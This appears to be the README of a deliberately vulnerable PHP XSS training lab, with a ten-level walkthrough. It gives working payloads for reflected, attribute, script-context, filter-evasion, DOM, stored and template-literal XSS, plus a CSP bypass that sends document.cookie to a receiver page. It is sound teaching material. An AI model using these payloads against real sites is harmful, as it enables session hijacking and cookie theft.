# 🛡️ XSS Masterclass Suite (10 Levels)

> **⚠️ WARNING: EDUCATIONAL PURPOSES ONLY**
> This repository contains intentionally vulnerable code designed for security training and educational purposes. **DO NOT** deploy this code in a production environment. Hosting this environment on a public-facing server without strict isolation (e.g., containerization, network segmentation) is dangerous and can lead to server compromise.

---

[![Security Level: Educational](https://img.shields.io/badge/Security_Level-Educational-blue.svg)]()
[![PHP](https://img.shields.io/badge/Language-PHP-777bb4.svg)]()

Welcome to the **XSS Masterclass Lab Suite**. This comprehensive, self-contained training arena contains 10 levels of increasing complexity, taking you from fundamental HTML context reflections to attribute breakouts, context escapes, DOM sinks, template literals, and CSP bypasses.

---

## 🎯 Lab Overview

| Level | Name | Primary Vulnerability |
| :--- | :--- | :--- |
| 🟢 | **Level 1** | HTML Context Reflected XSS |
| 🟢 | **Level 2** | HTML Attribute Breakout |
| 🟡 | **Level 3** | JavaScript String Context Escape |
| 🟡 | **Level 4** | WAF Tag Blacklist Evasion |
| 🟡 | **Level 5** | Anchor Href Pseudo-Protocol (`javascript:`) |
| 🔴 | **Level 6** | DOM-Based XSS (`innerHTML` Sink) |
| 🔴 | **Level 7** | DOM XSS in Dynamic Execution (`eval` Sink) |
| 🔴 | **Level 8** | Stored / Persistent XSS (Event Evasion) |
| 🟣 | **Level 9** | Template Literal Injection (ES6 Backticks) |
| 🟣 | **Level 10** | CSP Bypass & Cookie Exfiltration |

---

## 🚀 Quick Start

Ensure you have [PHP](https://www.php.net/) installed on your system.

```bash
# 1. Clone the repository (or navigate to the folder)
git clone https://github.com/zoly-zoly/XSS-Lab.git
cd xss-lab

# 2. Start the local server
# (You can use any available port)
php -S localhost:8080
```

👉 **Access the lab at:** `http://localhost:8080`

---

## 📓 Lab Walkthrough & Solutions

### 🟢 LEVEL 1: HTML Context Reflected XSS
*   **Vulnerability:** Input is directly reflected in the HTML body with zero encoding.
*   **Payload:**
    ```html
    <script>alert(document.cookie)</script>
    ```

---

### 🟢 LEVEL 2: HTML Attribute Breakout
*   **Vulnerability:** Input is placed inside an attribute (`value="..."`). The server strips `<` and `>`, but leaves quotes intact.
*   **Payload:**
    ```html
    " onfocus="alert(document.cookie)" autofocus="
    ```
*   *Alternative:* `" onclick="alert(1)"`

---

### 🟡 LEVEL 3: JavaScript String Context Escape
*   **Vulnerability:** Input is reflected inside a `<script>` string (`var username = '...'`). Double quotes are escaped, but single quotes are not.
*   **Payload:**
    ```javascript
    ';alert(document.cookie);//
    ```

---

### 🟡 LEVEL 4: WAF Tag Blacklist Evasion
*   **Vulnerability:** Regex strips `<script>` tags, but leaves alternative tags unblocked.
*   **Payload:**
    ```html
    <img src=x onerror=alert(document.cookie)>
    <svg onload=alert(document.cookie)>
    ```

---

### 🟡 LEVEL 5: Anchor Href Pseudo-Protocol
*   **Vulnerability:** Input is inserted into `<a href="...">`. All HTML tags are sanitized, but the URL scheme is unvalidated.
*   **Payload:**
    ```text
    javascript:alert(document.cookie)
    ```

---

### 🔴 LEVEL 6: DOM-Based XSS (innerHTML Sink)
*   **Vulnerability:** Client-side JavaScript injects `window.location.hash` directly into `innerHTML`.
*   **Payload:**
    ```html
    #<img src=x onerror=alert(document.cookie)>
    ```

---

### 🔴 LEVEL 7: DOM XSS in Dynamic Execution (eval Sink)
*   **Vulnerability:** Input is concatenated into an `eval("applyTheme('...')")` call.
*   **Payload:**
    ```javascript
    ';alert(document.cookie);//
    ```

---

### 🔴 LEVEL 8: Stored / Persistent XSS
*   **Vulnerability:** Comments are stored in the database. `<script>`, `onerror`, and `onload` are stripped.
*   **Payload (HTML5 autofocus/toggle events):**
    ```html
    <details ontoggle=alert(document.cookie) open>
    <input autofocus onfocus=alert(document.cookie)>
    ```

---

### 🟣 LEVEL 9: Template Literal Injection
*   **Vulnerability:** Input is placed inside ES6 backticks (` `...` `). Single and double quotes are sanitized, but `${...}` evaluates code directly.
*   **Payload:**
    ```javascript
    ${alert(document.cookie)}
    ```

---

### 🟣 LEVEL 10: CSP Bypass & Cookie Exfiltration (Final Boss)
*   **Vulnerability:** Input is reflected with no sanitization, but `connect-src 'self'` blocks `fetch()` and `XMLHttpRequest` from sending data to external origins.
*   **Payload (Top-Level Window Navigation Bypass):**
    ```html
    <script>window.location.href='cookie_receiver.php?stolen='+encodeURIComponent(document.cookie);</script>
    ```

---

## 🛡️ Security Policy & Disclaimer
Please see [SECURITY.md](SECURITY.md) for licensing and ethical usage instructions.

---
*Created with ❤️ by **Zoly** for Bug Bounty Mastery.*
